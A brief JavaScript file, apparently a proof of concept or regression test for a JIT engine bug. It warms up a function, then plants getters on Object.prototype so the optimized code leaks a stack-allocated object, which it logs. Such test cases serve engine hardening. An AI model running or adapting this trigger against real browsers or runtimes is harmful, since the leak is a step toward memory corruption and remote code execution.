function opt() {
    let o = {};
    o.x;
}
function main() {
    for (let i6 = 0; i6 < 10000; i6++) {
        opt();
    }
    let leaked_stack_object = null;
    let object_prototype = ({}).__proto__;
    object_prototype.__defineGetter__("x", Error.prototype.toString);
    function f24() {
        delete object_prototype.message;
        leaked_stack_object = this;
    }
    object_prototype.__defineGetter__("message", f24);
    object_prototype.name = Array.prototype;
    opt();
    console.log(leaked_stack_object);
}
main();
